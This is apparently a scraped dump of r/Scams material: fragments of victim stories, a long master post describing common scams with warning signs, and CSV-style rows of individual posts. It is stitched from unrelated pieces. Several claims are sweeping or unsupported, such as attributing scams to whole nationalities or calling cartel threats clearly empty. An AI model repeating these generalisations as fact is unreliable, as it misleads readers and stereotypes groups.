My new fake boss then directed me to send $1000 via venmo to his vendor (the first of multiple planned transactions). I kept offering to use a debit card. They asked if I could do Zelle. I opened a Zelle account. I came so close to actually sending this money. 

There was a problem with Zelle, and my ""oh fuck"" moment came when my new fake boss asked ""What Department/Grocery store  is close to you?"" and I realized, all of a sudden, that none of this made any sense. 

I googled around for a little bit trying to confirm that I was being scammed, and couldn't find any page detailing what I was going through. I noticed the client was interviewing with 16 other people on Upwork for this job they had already offered me. I reported them on Upwork, and I am self reporting here on r/scams for being a total fucking moron.

She’s sent thousands of dollars worth of Steam gift cards to this fake company that promises to send her 3x the money(in cash) in return. Obviously she never sees a dime, but they’ve brainwashed her to the point where she truly thinks these people are REAL.

##**If you know of a scam that is not covered here, write a comment and it will be added to the next edition.** 
 
Previous threads: https://reddit.com/r/Scams/search?q=common+scams+master+post&restrict_sr=on 

**Blackmail email scam thread: https://www.reddit.com/r/Scams/comments/n00kg3/the_blackmail_email_scam_part_7/**

  

Some of these articles are from small, local publications and refer to the scam happening in a specific area. **Do not** think that this means that the scam won't happen in your area.


#Spoofing 

**[Caller ID spoofing](https://www.fcc.gov/consumers/guides/spoofing-and-caller-id)**  

It is very easy for anyone to make a phone call while having any number show up on the caller ID of the person receiving the phone call. Receiving a phone call from a certain number does not mean that the person/company who owns that number has actually called you.

**[Email spoofing](https://www.barracuda.com/glossary/email-spoofing)** 

The ""from"" field of an email can be set by the sender, meaning that you can receive scam emails that look like they are from legitimate addresses. It's important to never click links in emails unless absolutely necessary, for example a password reset link you requested or an account activation link for an account you created.

**[SMS spoofing](https://en.wikipedia.org/wiki/SMS_spoofing)**

SMS messages can be spoofed, so be wary of messages that seem to be from your friends or other trusted people.

#The most common scams

**[The fake check scam](https://www.consumer.ftc.gov/articles/0159-fake-checks)**   
(Credit to /u/nimble2 for this part)

The fake check scam arises from many different situations (for instance, you applied for a job, or you are selling something on a place like Craigslist, or someone wants to purchase goods or services from your business, or you were offered a job as a mystery shopper, you were asked to wrap your car with an advertisement, or you received a check in the mail for no reason), but the bottom line is always something like this:

* The scammer sends you a very real looking, but fake, check. Sometimes they'll call it a ""cashier's check"", a ""certified check"", or a ""verified check"".

* You deposit the check into your bank account, and within a couple of days your bank makes some or all of the funds available to you. This makes you think that the check is real and the funds have cleared. However, the money appearing in your account **is not** the same as the check actually clearing. The bank must make the funds available to you before they have cleared the check because that is the law. 
* For various and often complicated reasons, depending on the specific story line of the scam, the scammer will ask you to send someone some of the money, using services like MoneyGram, Western Union, and Walmart-2-Walmart. Sometimes the scammer will ask for you to purchase gift cards (iTunes, Amazon, Steam, etc) and give them the codes to redeem the gift cards. Some scammers may also give you instructions on how to buy and send them bitcoins. 

* Within a couple of weeks, though it can take as long as a month, your bank will realize that the check you deposited was fake, and your bank will remove the funds that you deposited into your account and charge you a bounced check fee. If you withdrew any of the money from the fake check, that money will be gone and you will owe that money to the bank. Some posters have even had their bank accounts closed and have been blocked from having another account for 5 years using ChexSystems.
   
   
**General fraudulent funds scams**   
If somebody is asking you to accept and send out money as a favour or as part of a job, it is a fraudulent funds scam. It does not matter how they pay you, any payment on any service can be fraudulent and will be reversed when it is discovered to be fraudulent. 


**[Phone verification code scams](https://computertutorflorida.com/2019/01/the-verification-code-scam/)**  
Someone will ask you to receive a verification text and then tell you to give them the code. Usually the code will come from Google Voice, or from Craigslist. In the Google version of the scam, your phone number will be used to verify a Google Voice account that the scammer will use to scam people with. In the Craigslist version of the scam, your phone number will be used to verify a Craigslist posting that the scammer will use to scam people.  There is also an account takeover version of this scam that will involve the scammer sending a password reset token to your phone number and asking you for it.


**Bitcoin job scams**   

Bitcoin job scams involve some sort of fraudulent funds transfer, usually a fake check although a fraudulent bank transfer can be used as well. The scammer will send you the fraudulent money and ask you to purchase bitcoins. This is a scam, and you will have zero recourse after you send the scammer bitcoins.    

**[Email flooding](https://krebsonsecurity.com/2012/07/cyberheist-smokescreen-email-phone-sms-floods/)** 
 
If you suddenly receive hundreds or thousands of spam emails, usually subscription confirmations, it's very likely that one of your online accounts has been taken over and is being used fraudulently. You should check any of your accounts that has a credit card linked to it, preferably from a computer other than the one you normally use. You should change all of your passwords to unique passwords and you should start using two factor authentication everywhere.  

**[Cartel scam](https://newyork.cbslocal.com/2019/08/13/scam-brooklyn-bloody-pics-cartel/)**

You will be threatened by scammers who claim to be affiliated with a cartel. They may send you gory pictures and threaten your life and the lives of your family. Usually the victim will have attempted to contact an escort prior to the scam, but sometimes the scammers target people randomly. If you are targeted by a cartel scam all you need to do is ignore the scammers as their threats are clearly empty. 


**[Boss/CEO scam](https://abc7chicago.com/finance/gift-card-scam-uses-bosses-email-addresses-when-phishing/4556080/)**  
A scammer will impersonate your boss or someone who works at your company and will ask you to run an errand for them, which will usually be purchasing gift cards and sending them the code. Once the scammer has the code, you have no recourse. 

**Employment certification scams**  

You will receive a job offer that is dependent on you completing a course or receiving a certification from a company the scammer tells you about. The scammer operates both websites and the job does not exist. 

**Craigslist fake payment scams**    

Scammers will ask you about your item that you have listed for sale on a site like Craigslist, and will ask to pay you via Paypal. They are scamming you, and the payment in most cases does not actually exist, the email you received was sent by the scammers. In cases where you have received a payment, the scammer can dispute the payment or the payment may be entirely fraudulent. The scammer will then either try to get you to send money to them using the fake funds that they did not send to you, or will ask you to ship the item, usually to a re-shipping facility or a parcel mule. 

**[Craigslist Carfax/vehicle history scam](https://www.consumer.ftc.gov/blog/2018/10/steering-clear-vehicle-history-report-scams)**

You'll encounter a scammer on Craigslist who wants to buy the vehicle you have listed, but they will ask for a VIN report from a random site that they have created and they will expect you to pay for it. 

**[Double dip/recovery scammers](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams)**

This is a scam aimed at people who have already fallen for a scam previously. Scammers will reach out to the victim and claim to be able to help the victim recover funds they lost in the scam. 

**General fraudulent funds scams**   
The fake check scam is not the only scam that involves accepting fraudulent/fake funds and purchasing items for scammers. If your job or opportunity involves accepting money and then using that money, it is almost certainly a frauduent funds scam. Even if the payment is through a bank transfer, Paypal, Venmo, Zelle, Interac e-Transfer, etc, it does not matter.    

**[Credit card debt scam](http://www.wndu.com/home/headlines/New-scam-offers-to-pay-off-credit-card-debt-276992911.html)**   

Fraudsters will offer to pay off your bills, and will do so with fraudulent funds. Sometimes it will be your credit card bill, but it can be any bill that can be paid online. Once they pay it off, they will ask you to send them money or purchase items for them. The fraudulent transaction will be reversed in the future and you will never be able to keep the money. This scam happens on sites like Craigslist, Twitter, Instagram, and also some dating sites, including SeekingArrangement. 

**[The parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam)**  

A scammer will contact you with a job opportunity that involves accepting and reshipping packages. The packages are either stolen or fraudulently obtained items, and you will not be paid by the scammer. [Here](http://abc7chicago.com/mans-identity-stolen-during-work-from-home-job-scam/3337661/) is a news article about a scam victim who fell for this scam and reshipped over 20 packages containing fraudulently acquired goods. 


**[The Skype sex scam](http://www.bbc.com/news/magazine-37735369)**   

You're on Facebook and you get a friend request from a cute girl you've never met. She wants to start sexting and trading nudes. She'll ask you to send pictures or videos or get on webcam where she can see you naked with your face in the picture.  
The scam: There's no girl. You've sent nudes to a guy pretending to be a girl. As soon as he has the pictures he'll demand money and threaten to send the pictures to your friends and family. Sometimes the scammer will upload the video to a porn site or Youtube to show that they are serious. 

What to do if you are a victim of this scam: You cannot buy silence, you can only rent it. Paying the blackmailer will show them that the information they have is valuable and they will come after you for more money. Let your friends and family know that you were scammed and tell them to ignore friend requests or messages from people they don't know. Also, make sure your privacy settings are locked down and consider deactivating your account. 


**[The underage girl scam](https://www.thedailybeast.com/prisoners-catfished-soldiers-from-behind-bars-posing-as-underage-girls-army-says)** 
 
You're on a dating site or app and you get contacted by a cute girl. She wants to start sexting and trading nudes. Eventually she stops communicating and you get a call from a pissed off guy claiming to be the girl's father, or a police officer, or a private investigator, or something else along those lines. Turns out the girl you were sexting is underage, and her parents want some money for various reasons, such as to pay for a new phone, to pay for therapy, etc. There is, of course, no girl. You were communicating with a scammer. 

What to do if you are a victim of this scam: Stop picking up the phone when the scammers call. Do not pay them, or they will be after you for more money.

**[Phishing](https://en.wikipedia.org/wiki/Phishing)**  

Phishing is when a scammer tries to trick you into giving information to them, such as your password or private financial information. Phishing messages will usually look very similar to official messages, and sometimes they are identical. If you are ever required to login to a different account in order to use a service, you should be incredibly cautious.

PSA: you did not win a giftcard: https://old.reddit.com/r/Scams/comments/fffmle/psa_you_did_not_win_a_gift_card/


**[Sugar scams](https://www.fraud.org/sugarbaby_alert)**

Sugar scammers operate all over the internet and usually come in two varieties: advance-fee scams where the scammer will ask for a payment from you before sending you lots of money, and fake check style scams where the scammer will either pull a classic fake check scam, or will do a ""bill pay"" style scam that involves them paying your bills, or them giving you banking information to pay your bills. If you encounter these scammers, report their accounts and move on. 


**[Google Hangouts](https://medium.com/@HonourableHappy/warning-google-hangouts-a-hotbed-for-scams-fraud-54631305e363)** 

Google Hangouts is a messaging platform used extensively by all kinds of scammers. If you are talking with someone online and they want you to switch to Hangouts, they are likely a scammer and you should proceed with caution. 


**[Publishers Clearing House scams](https://www.consumer.ftc.gov/blog/2018/04/publishers-clearing-house-imposters-keep-coming)**

PCH scams are often advance-fee scams, where you will be promised lots of money after you make an initial payment. [You will never need to pay if you win money from the real PCH.](https://info.pch.com/fraud-protection-2/)

**[Pet scams](https://www.bbb.org/article/investigations/14214-puppy-scams-how-fake-online-pet-sellers-steal-from-unsuspecting-pet-buyers-a-bbb-study)**

You are looking for a specific breed of puppy, bird, or other pet. You come across a nice-looking website that claims to be breeding them and has some available right now - they may even be on sale! The breeders are not local to your area (and may not even list a physical location) but they assure you they can safely ship the pet to you after a deposit or full payment. If you go through with the payment, you will likely be contacted by the ""shipper"" who will inform you about an unexpected shipping/customs/processing fee required to deliver your new pet. But there was never any pet, both the ""breeder"" and the ""shipper"" are scammers, typically operating out of Africa. These sites are rampant and account for a large percentage of online pet seller websites - they typically have a similar layout/template (screenshot - example)

If you are considering buying a pet online, some easy things to check are: (1) The registration date of the domain (if it was created recently it is likely a scam website) (2) Reverse image search the pictures of available pets - you will usually find other scam websites using the same photos. (3) Copy a sentence/section of the text from the ""about us"" page and put it into google (in quotes) - these scammers often copy large parts of their website's text from other places. (4) Search for the domain name and look for entries on petscams.com or other scam-tracking sites. (5) Strongly consider buying/adopting your pet from a local shelter or breeder where you can see the animal in person before putting any money down.

Thanks to /u/djscsi for this entry.

**Fake shipping company scams**

These scams usually start when you try to buy something illegal online, though not always. You will be scammed for the initial payment, and then you will receive an email from the fake shipping company telling you that you need to pay them some sort of fee or bribe. If you pay this, they will keep trying to scam you with increasingly absurd stories until you stop paying, at which point they will blackmail you. If you are involved in this scam, all you can do is ignore the scammers and move on, and try to dispute your payments if possible. 

**[Chinese Upwork scam](https://community.upwork.com/t5/New-to-Upwork/People-are-asking-me-to-use-my-account/td-p/502692)**

Someone will ask you to create an Upwork or other freelancer site account for them and will offer money in return. You will not be paid, and they want to use the accounts to scam people. 

**[Quickbooks invoice scam](https://i.imgur.com/QbPwQtq.jpg)** 

This is a fake check style scam that takes advantage of Quickbooks.

**[The blackmail email scam](https://www.reddit.com/r/Scams/comments/9srjen/the_blackmail_email_scam_part_2/)**  
The exact wording of the emails varies, but there are generally four main parts. They claim to have placed software/malware on a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video. Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. [Here](http://www.smh.com.au/technology/gadgets-on-the-go/latest-online-scam-aims-to-prick-porn-watchers-guilty-conscience-20170815-gxwvxl.html) are [some](https://www.fraudhelpdesk.org/alerts/blackmail-email-watching-porn/) news [articles](https://www.bbb.org/denver/news-events/news-releases/2017/09/alert-pornography-email-phishing-scam/) about [this](http://blog.dynamoo.com/2017/10/bogus-porn-blackmail-attempt-from.html) scam. 

**[The blackmail mail scam](https://krebsonsecurity.com/2018/01/bitcoin-blackmail-by-snail-mail-preys-on-those-with-guilty-conscience/)**    

This is very similar to the blackmail email scam, but you will receive a letter in the mail. 

**[Rental scams](https://www.cambridgema.gov/cpd/communityresources/CrimePrevention/craigslistscams.aspx)**   
Usually on local sites like Craigslist, scammers will steal photos from legitimate real estate listings and will list them for rent at or below market rate. They will generally be hesitant to tell you the address of the property for ""safety reasons"" and you will not be able to see the unit. They will then ask you to pay them a deposit and they claim they will ship you the keys. In reality, your money is gone and you will have no recourse.    

**[Craigslist vehicle scams](https://www.fraudguides.com/internet/craigslist/car-scams/)**
A scammer will list a vehicle on Craigslist and will offer to ship you the car. In many cases they will also falsely claim to sell you the car through eBay or Amazon. If you are looking for a car on Craigslist and the seller says anything about shipping the car, having an agent, gives you a long story about why they are selling the car, or the listing price is far too low, you are talking to a scammer and you should ignore and move on. 
  
  
**[Advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam)**, also known as the 419 scam, or the Nigerian prince scam. You will receive a communication from someone who claims that you are entitled to a large sum of money, or you can help them obtain a large sum of money. However, they will need money from you before you receive the large sum. 

**[Man in the middle scams](https://www.commerce.wa.gov.au/announcements/wa-organisations-lose-500000-man-middle-scams)**     

Man in the middle scams are very common and very hard to detect. The scammer will impersonate a company or person you are legitimately doing business with, and they will ask you to send the money to one of their own bank accounts or one controlled by a money mule. They have gained access to the legitimate persons email address, so there will be nothing suspicious about the email. To prevent this, make contact in a different way that lets you verify that the person you are talking to is the person you think you are talking to. 

[**Digit wallet scam**](https://www.bbb.org/article/news-releases/22128-scam-alert-this-venmo-scam-sends-you-money-by-accident)

A variation of the fake check scam, the scammer sends you money through a digital wallet (i.e. Venmo, Apple Pay, Zelle, Cash App) along with a message claiming they've sent the money to the wrong person and a request to send the money back. Customer service for these digital wallets may even suggest that you send the money back. However, the money sent is from a stolen credit card and will be removed from your account after a few days. Your transfer is not reversed since it came from your own funds.

**[Cam girl voting/viewer scam](https://mashable.com/2013/07/12/tinder-scam/)**

You will encounter a ""cam girl"" on a dating/messaging/social media/whatever site/app, and the scammer will ask you to go to their site and sign up with your credit card. They may offer a free show, or ask you to vote for them, or any number of other fake stories. 

**[Amateur porn recruitment scam](https://www.reddit.com/r/Scams/comments/bjygwg/instagramtinder_scam/)**

You will encounter a ""pornstar"" on a dating/messaging/social media/whatever site/app, and the scammer will ask you to create an adult film with her/him, but first you need to do something. The story here is usually something to do with verifying your age, or you needing to take an STD test that involves sending money to a site operated by the scammer. 

**Hot girl SMS spam**

You receive a text from a random number with a message along the lines of ""Hey babe I'm here in town again if you wanted to meet up this time, are you around?"" accompanied by a NSFW picture of a hot girl. It's spam, and they'll direct you to their scam website that requires a credit card. 

**[Identity verification scam](https://theonlinedatingscams.com/age-or-date-verification-scam/)**  

You will encounter someone on a dating/messaging/social media/whatever site/app, and the scammer will ask that you verify your identity as they are worried about catfishing. The scammer operates the site, and you are not talking to whoever you think you are talking to. 


This type of scam teases you with something, then tries to make you sign up for something else that costs money. The company involved is often innocent, but they turn a blind eye to the practice as it helps their bottom line, even if they have to occasionally issue refunds. A common variation takes place on dating sites/dating apps, where you will match with someone who claims to be a camgirl who wants you to sign up for a site and vote for her. Another variation takes place on local sites like Craigslist, where the scammers setup fake rental scams and demand that you go through a specific service for a credit check. Once you go through with it, the scammer will stop talking to you. Another variation also takes place on local sites like Craigslist, where scammers will contact you while you are selling a car and will ask you to purchase a Carfax-like report from a specific website.


**[Multi Level Marketing or Affiliate Marketing](https://reddit.com/r/antimlm)**

You apply for a vague job listing for 'sales' on craigslist. Or maybe an old friend from high school adds you on Facebook and says they have an amazing business opportunity for you. Or maybe the well dressed guy who's always interviewing people in the Starbucks that you work at asks if you really want to be slinging coffee the rest of your life.  
The scam: MLMs are little more than pyramid schemes. They involve buying some sort of product (usually snake oil health products like body wraps or supplements) and shilling them to your friends and family. They claim that the really money is recruiting people underneath you who give you a slice of whatever they sell. And if those people underneath you recruit more people, you get a piece of their sales. Ideally if you big enough pyramid underneath you the money will roll in without any work on your part. Failure to see any profit will be your fault for not ""wanting it enough."" The companies will claim that you need to buy their extra training modules or webinars to really start selling. But in reality, the vast majority of people who buy into a MLM won't see a cent. At the end of the day all you'll be doing is annoying your friends and family with your constant recruitment efforts.
What to look out for: Recruiters love to be vague. They won't tell you the name of the company or what exactly the job will entail. They'll pump you up with promises of ""self-generating income"", ""being your own boss"", and ""owning your own company."" They might ask you to read books about success and entrepreneurs. They're hoping you buy into the dream first.   
If you get approached via social media, check their timelines. MLMs will often instruct their victims to pretend that they've already made it. They'll constantly post about how they're hustling and making the big bucks and linking to youtube videos about success. Again, all very vague about what their job actually entails.
If you think you're being recruited: Ask them what exactly the job is. If they can't answer its probably a MLM. Just walk away.

##**Phone scams**

You should generally avoid answering or engaging with random phone calls. Picking up and engaging with a scam call tells the scammers that your phone number is active, and will usually lead to more calls. 

**Tax Call** 

You get a call from somebody claiming to be from your countries tax agency. They say you have unpaid taxes that need to be paid immediately, and you may be arrested or have other legal action taken against you if it is not paid. This scam has caused the [American IRS](https://www.irs.gov/uac/newsroom/scam-phone-calls-continue-irs-identifies-five-easy-ways-to-spot-suspicious-calls), [Canadian CRA](http://www.cra-arc.gc.ca/scrty/frdprvntn/menu-eng.html), [British HMRC](https://www.gov.uk/topic/dealing-with-hmrc/phishing-scams), and [Australian Tax Office](https://www.ato.gov.au/general/online-services/identity-security/verify-or-report-a-scam/) to issue warnings. This scam happens in a wide variety of countries all over the world. 

**[Warrant Call](http://wqad.com/2017/02/03/scott-county-sheriff-arrest-warrant-phone-calls-are-scams/)** 

Very similar to the tax call. You'll get a phone call from an ""agent"", ""officer"", ""sheriff"", or other law enforcement officer claiming that there is a warrant out for your arrest and you will be arrested very soon. They will then offer to settle everything for a fee, usually paid in giftcards. 

**[Legal Documents/Process Server Calls]**

Very similar to the warrant call. You'll get a phone call from a scammer claiming that they are going to serve you legal documents, and they will threaten you with legal consequences if you refuse to comply. They may call themselves ""investigators"", and will sometimes give you a fake case number. 

**[Student Loan Forgiveness Scam](https://www.snopes.com/fact-check/student-loan-forgiveness-scam/)**    
 
Scammers will call you and tell you about a student loan forgiveness program, but they are interested in obtaining private information about you or demanding money in order to join the fake program.    

**[Tech Support Call](https://en.wikipedia.org/wiki/Technical_support_scam)** 
 You receive a call from someone with a heavy accent claiming to be a technician Microsoft or your ISP. They inform you that your PC has a virus and your online banking and other accounts may be compromised if the virus is not removed. They'll have you type in commands and view diagnostics on your PC which shows proof of the virus. Then they'll have you install remote support software so the technician can work on your PC, remove the virus, and install security software. The cost of the labor and software can be hundreds of dollars.  
The scam: There's no virus. The technician isn't a technician and does not work for Microsoft or your ISP. Scammers (primarily out of India) use autodialers to cold-call everyone in the US. Any file they point out to you or command they have you run is completely benign. The software they sell you is either freeware or ineffective.  
What to do you if you're involved with this scam: If the scammers are remotely on your computer as you read this, turn off your PC or laptop via the power button immediately, and then if possible unplug your internet connection. Some of the more vindictive tech scammers have been known to create boot passwords on your computer if they think you've become wise to them and aren't going to pay up. Hang up on the scammers, block the number, and ignore any threats about payment. Performing a system restore on your PC is usually all that is required to remove the scammer's common remote access software. Reports of identity theft from fake tech calls are uncommon, but it would still be a good idea to change your passwords for online banking and monitor your accounts for any possible fraud.  
How to avoid: Ignore any calls claiming that your PC has a virus. Microsoft will never contact you. If you're unsure if a call claiming to be from your ISP is legit, hang up, and then dial the customer support number listed on a recent bill. If you have elderly relatives or family that isn't tech savvy, take the time to fill them in on this scam.   

**[Chinese government scam](https://www.consumer.ftc.gov/blog/2018/04/scammers-impersonate-chinese-consulate)**  

This scam is aimed at Chinese people living in Europe and North America, and involves a voicemail from someone claiming to be associated with the Chinese government, usually through the Chinese consulate/embassy, who is threatening legal action or making general threats.

**[Chinese shipping scam](https://www.ic3.gov/media/2019/190328.aspx)**  

This scam is similar to the Chinese government scam, but involves a seized/suspicious package, and the scammers will connect the victim to other scammers posing as Chinese government investigators. 

**[Social security suspension scam](https://www.consumer.ftc.gov/blog/2018/09/your-social-security-number-isnt-suspended-ever)**  

You will receive a call from someone claiming to work for the government regarding suspicious activity, fraud, or serious crimes connected to your social security number. You'll be asked to speak to an operator and the operator will explain the steps you need to follow in order to fix the problems. It's all a scam, and will lead to you losing money and could lead to identity theft if you give them private financial information. 
  

**Utilities cutoff** 

You get a call from someone who claims that they are from your utility company, and they claim that your utilities will be shut off unless you immediately pay. The scammer will usually ask for payment via gift cards, although they may ask for payment in other ways, such as Western Union or bitcoin. 

**[Relative in custody](https://www.consumer.ftc.gov/articles/0204-family-emergency-scams)**  
Scammer claims to be the police, and they have your son/daughter/nephew/estranged twin in custody. You need to post bail (for some reason in iTunes gift cards or MoneyGram) immediately or the *consequences will never be the same*.   

**[Mexican family scam](https://www.consumer.ftc.gov/blog/2018/07/scammers-create-fake-emergencies-get-your-money)** 

This scam comes in many different flavours, but always involves someone in your family and Mexico. Sometimes the scammer will claim that your family member has been detained, sometimes the scammer will claim that your family member has been kidnapped, and sometimes the scammer will claim that your family member is injured and needs help.  

**General family scams** 

Scammers will gather a large amount of information about you and target your family members using different stories with the goal of gettimg them to send money. 


**[One ring scam](https://www.fcc.gov/consumers/guides/one-ring-phone-scam)**  

Scammers will call you from an international number with the goal of getting you to return their call, causing you to incur expensive calling fees. 


##**Online shopping scams**  
**THE GOLDEN RULE OF ONLINE SHOPPING: If it sounds too good to be true, it probably is.**


**Dropshipping**  

An ad on reddit or social media sites like Facebook and Instagram offers items at huge discounts or even free (sometimes requiring you to reblog or like their page). They just ask you to pay shipping.   
The scam: The item will turn out to be very low quality and will take weeks or even months to arrive. Sometimes the item never arrives, and the store disappears or stops responding. The seller drop-ships the item from China. The item may only cost a few dollars, and the Chinese government actually pays for the shipping. You end up paying $10-$15 dollars for a $4 item, with the scammer keeping the profit. If you find one of these scams but really have your heart set on the item, you can find it on AliExpress or another Chinese retailer.  


**[Influencer scams](https://theuncorkedlibrarian.com/instagram-scams/)** 

A user will reach out to you on a social media platform, usually Instagram, and offer you the chance to partner with them and receive a free/discounted product, as long as you pay shipping. This is a different version of the dropshipping scam, and is just a marketing technique to get you to buy their products.


**[Triangulation fraud](https://krebsonsecurity.com/2015/11/how-carders-can-use-ebay-as-a-virtual-atm/)**    

Triangulation fraud occurs when you make a purchase on a site like Amazon or eBay for an item at a lower than market price, and receive an item that was clearly purchased new at full price. The scammer uses a stolen credit card to order your item, while the money from the listing is almost all profit for the scammer. 

**Instagram influencer scams**  

Someone will message you on Instagram asking you to promote their products, and offering you a discount code. The items are Chinese junk, and the offer is made to many people at a time. 

**Cheap Items** 

Many websites pop up and offer expensive products, including electronics, clothes, watches, sunglasses, and shoes at very low prices.  
The scam: Some sites are selling cheap knock-offs. Some will just take your money and run.    
What to do if you think you're involved with this scam: Contact your bank or credit card and dispute the charge.   
How to avoid: The sites often have every brand-name shoe or fashion item (Air Jordan, Yeezy, Gucci, etc) in stock and often at a discounted price. The site will claim to be an outlet for a major brand or even a specific line or item. The site will have images at the bottom claiming to be Secured by Norton or various official payment processors but not actual links. The site will have poor grammar and a mish-mash of categories. Recently, established websites will get hacked or their domain name jacked and turned into scam stores, meaning the domain name of the store will be completely unrelated to the items they're selling. If the deal sounds too good to be true it probably is. Nobody is offering brand new iPhones or Beats or Nintendo Switches for 75% off. 


**[Cheap Amazon 3rd Party Items](https://www.forbes.com/sites/wadeshepard/2017/01/02/amazon-scams-on-the-rise-in-2017-as-fraudulent-sellers-run-amok-and-profit-big/)** 

You're on Amazon or maybe just Googling for an item and you see it for an unbelievable price from a third-party seller. You know Amazon has your back so you order it. 
The scam: One of three things usually happen:  
1) The seller marks the items as shipped and sends a fake tracking number. Amazon releases the funds to the seller, and the seller disappears. Amazon ultimately refunds your money.
2) The seller immediately cancels the order and instructs you to re-order the item directly from their website, usually with the guarantee that the order is still protected by Amazon. The seller takes your money and runs. Amazon informs you that they do not offer protection on items sold outside of Amazon and cannot help you.  
2) The seller immediately cancels the order and instructs you to instead send payment via an unused Amazon gift card by sending the code on the back via email. Once the seller uses the code, the money on the card is gone and cannot be refunded.    
How to avoid: These scammers can be identified by looking at their Amazon storefronts. They'll be brand new sellers offering a wide range of items at unbelievable prices. Usually their Amazon names will be gibberish, or a variation on FIRSTNAME.LASTNAME. Occasionally however, established storefronts will be hacked. If the deal is too good to be true its most likely a scam.     

**Scams on eBay**    

There are scams on eBay targeting both buyers and sellers. As a seller, you should look out for people who privately message you regarding the order, especially if they ask you to ship to a different address or ask to negotiate via text/email/a messaging service. As a buyer you should look out for new accounts selling in-demand items, established accounts selling in-demand items that they have no previous connection to (you can check their feedback history for a general idea of what they bought/sold in the past), and lookout for people who ask you to go off eBay and use another service to complete the transaction. In many cases you will receive a fake tracking number and your money will be help up for up to a month.   

**Scams on Amazon**   

There are scams on Amazon targeting both buyers and sellers. As a seller, you should look out for people who message you about a listing. As a buyer you should look out for listings that have an email address for you to contact the person to complete the transaction, and you should look out for cheap listings of in-demand items.  


**Scams on Reddit** 

Reddit accounts are frequently purchased and sold by fraudsters who wish to use the high karma count + the age of the account to scam people on buy/sell subreddits. You need to take precautions and be safe whenever you are making a transaction online. 

**Computer scams**

**[Virus scam](http://www.kadansky.com/files/newsletters/2015/2015_08_31.html)** 

A popup or other ad will say that you have a virus and you need to follow their advice in order to remove it. They are lying, and either want you to install malware or pay for their software. 

##**Assorted scams**

**[Chinese Brushing / direct shipping](https://www.forbes.com/sites/wadeshepard/2017/11/27/americans-are-receiving-unordered-parcels-from-chinese-e-criminals-and-cant-do-anything-about-it/#16b4a3cf73da)** 

 If you have ever received an unsolicited small package from China, your address was used to [brush](https://www.wsj.com/articles/fake-orders-brush-up-online-sales-in-china-1425386416). Vendors place fake orders for their own products and send out the orders so that they can increase their ratings.      

**[Money flipping](https://www.stopfraudcolorado.gov/fraud-center/digital-fraud/money-flipping-scams.html)** 

Scammer claims to be a banking insider who can double/triple/bazoople any amount of money you send them, with no consequences of any kind. Obviously, the money disappears into their wallet the moment you send it.

1680888090.0,Reminder- These posts are SCAMS. (Rent to Own Ads in Facebook Groups),"Adding this so people can easily look it up- these type of posts are scams. If you look at the picture closely, you can see these photos have the “For Rent” sign photoshopped in. As housing prices rise, people try to scam people looking for good options. 

They scam you by not only 1. getting your information but also 2. ask for admin fees/early deposit/etc. before you can see the place. They take your money and disappear. I also encourage people to not click on shortened links or links from people they don’t trust.  

Be careful, remain vigilant, due your diligence! Stay safe out there!",Scams,594,105,15,1
1682127581.0,Recent scam attempt on public transport,"I was travelling to work recently and was playing a game on my phone, when a woman came and sat next to me (I was already annoyed at this point since there were plenty of empty seats) and asked if she could use my phone to send a text. She had a phone on her that looked like a burner phone, so I was worried she was going to try and either steal my phone, or clone my details somehow. I at first politely told her no, I don't let people use my phone ever. She got a bit aggressive saying that it was urgent, so I raised my voice and made it very clear so the other passengers could hear me, that I've already told her no, I'm not letting her use my phone as I've never met her before in my life. I wasn't sure it was a scam, but I was pretty convinced. 

Later that night when I'm coming back from work and I'm waiting for the train to come, I see the same woman, now with a shady looking guy saying how they needed desperately to use a drunk guys phone to call their 3 children. I was going to say something but the drunk guy was not as easy prey as they thought, as I was listening and he was picking every hole in their story. Luckily neither of us fell for it, but I can imagine how many people would.",Scams,1206,246,27,1
1685212142.0,Someone is running a scam on our house...but I don't understand the scam,"Yesterday people started showing up at our house (we own it) saying they had an appointment with a ""Smith"" to tour it for rent. They all contacted him through a ""button"" on Zillow and Trulia. By the time these folks showed it to us the button was gone but ""Smith"" kept texting them to go look at the house.

The rent was way below market, so the scammer got that part right, but for all these people they came to discover they had been scammed without paying a dime. They were all locals. 

We asked to see the communications between them and the scammer so we called the scammer ourselves and pretended to be interested renters. He gave us an appointment and just like the other folks he never showed and then didn't respond after that.

So what's going on here? How does this scammer make any money? Is he just polite to locals to keep up the scam but then he pounces on the interested renters that aren't local and then scams them out of a zelle deposit or something? He is using interior photos from a house down the street that's for sale right now so the photos show an empty home. But in person all these people realize that the exterior and interior are two different (but similar) homes. So is he just weeding out false positives hoping to find someone out of state?

We have already taken down the ""rental"" listings that we found, but what else can we do? As of 20 mins ago this guy still answers new phone calls about the ""rental"" ... Can we report the number to telecom companies? What can we do? We are worried about our own safety as well as the folks getting scammed.

UPDATE: okay, so I never expected this many responses, thank you all for your thoughts. We have reported this to the FTC, our neighborhood council president, Zillow, Google,  our local police department officers, and informed our neighbors. We already had our home ""claimed"" on Zillow before this so it's unclear how the listing even happened, but Zillow is ""investigating.""  It's been 24 hours now since anyone has shown up for an appointment so those are likely over, we are just hoping there isn't a victim that will show up with a U-Haul on the first.

UPDATE #2: Zillow finished their investigation and emailed me ....but with a completely different address and incident date. So ...yeah, they obviously care a lot about this problem. They also made no changes to the listing except make it not a currently for rent  listing. Even though I have claimed the house I am unable to remove the photos (the listing had photos from two different homes in it) or anything...so I have opened another request for that.

The police had fun pointing us in ten different directions without doing anything at all themselves. We submitted an official report for identity theft as that's the closest thing the city attorney and officers thought might fit the laws potentially broken. Essentially WE can't really expect the police to do much because we didn't lose any money, the person that (hopefully doesn't) show up with a U-Haul out 5 grand will have to talk to the police to expect any movement.",Scams,3073,550,82,1

But then it asked me for my card info, stating they needed to collect a ""$0,35"" reprocessing fee, which immediately put me on guard.

A month later, our phones are pinging in China and were receiving texts such as this one. We're not clicking any links or responding, but we're wondering if there's anything we should do further. Do I remove my phone from ""Find My"" for its safety? If it's actually jailbroken can they cause harm to my iCloud? Or are they not able to use the phone since it's marked as lost, and I should keep it connected to iCloud so they're unable to gain access?

We're honestly curious to know what's going on with the phones, too. Were they stolen and then sold to someone who shipped them off to China to be refurbished?

